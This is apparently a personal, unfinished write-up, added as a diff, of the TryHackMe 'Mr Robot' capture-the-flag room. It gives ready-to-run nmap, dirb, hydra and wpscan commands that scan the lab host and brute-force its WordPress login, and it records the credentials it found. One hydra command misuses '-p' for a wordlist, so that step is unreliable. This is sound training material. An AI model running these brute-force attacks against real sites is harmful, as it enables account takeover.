@@ -1,0 +1,80 @@
+All steps and concepts about CTF made on https://tryhackme.com/room/mrrobot
+
+1 - Start Machine on tryhackme 
+2 - Connect on VPN (download configuration file and connect via terminal)
+
+    sudo openvpn lfsain.ovpn
+
+3 - Test IP with ping 10.10.94.232
+
+3 - Make PortScaning with nmap
+
+    sudo nmap -sS 10.10.94.232 | tee nmap-ss.txt (-sS quick scan , tee to save on txt file)
+
+    returned: 
+
+    22/tcp  closed ssh
+    80/tcp  open   http
+    443/tcp open   https
+
+4 - So, it returned that are a service HTTP running at 80 , if open the browser with ip adress, it'll show a web page animation of Mr Robot
+
+5 - It's talked about Directories of Web Application
+
+6 - 'Dirb' is used to map all the know Directories tha can exists and are common
+    On /usr/share/wordlists/dirb/
+
+    dirb http://10.10.94.232/ -o dirb.txt (-o save output on file)
+
+
+7 - There are a robots.txt, so , if it is open on browser will return some folder to dont be avoid, like:
+
+    User-agent: *
+    fsocity.dic
+    key-1-of-3.txt
+
+    So, there are one, saying to dont open the 'key-1-of-3.txt'
+
+    If you access on browser like http://10.10.94.232/key-1-of-3.txt
+
+    It return the firt flag of CTF
+
+8 - The fsocity.dic is a wordlist with many words. So we'll download it
+
+    wget http://10.10.94.232/fsocity.dic
+
+9 - The fsocity.dic it's so long and have many words. It has many reapts words. To get it cleared, we need run 
+
+    sort fsocity.dic | uniq > unicos.txt
+
+9 - NOTE: It's a Wordpress running, because on path /feed return on dirb
+
+10 - Attack Brutal Force in the wp-login form . It's talked too about 'Burp Suite'. 
+    
+    The 'Burp Suite' analises how work the connection between your machine and target.
+
+    We need it to know how the login form works and url , param's etc
+
+    We'll use the 'hydra' to automaze the process
+
+    hydra -L unicos.txt -p admin 10.10.94.232 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.94.232%2Fwp-admin%2F&testcookie=1:Invalid username" -F -V
+    
+    (-L list, -p password, http-post-form is the hydra resource, -F firt ocour stop, -V verbose and see on terminal whats goin on)
+
+    The firt user found is 'elliot'
+
+11 - With the user, will force the password with hydra, with same unicos.txt
+
+    hydra -l elliot -p unicos.txt 10.10.94.232 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.94.232%2Fwp-admin%2F&testcookie=1:Invalid username" -F -V
+
+    or with 'wpscan': (diferrence is tha wpscan is focused on wordpress Attack bruteforce)
+
+    wpscan --url 10.10.6.242 --passwords unicos.txt --usernames elliot
+
+    password found 'ER28-0652'
+     
+
+12 - Stopped 43:23
+
+ip 10.10.6.242
+
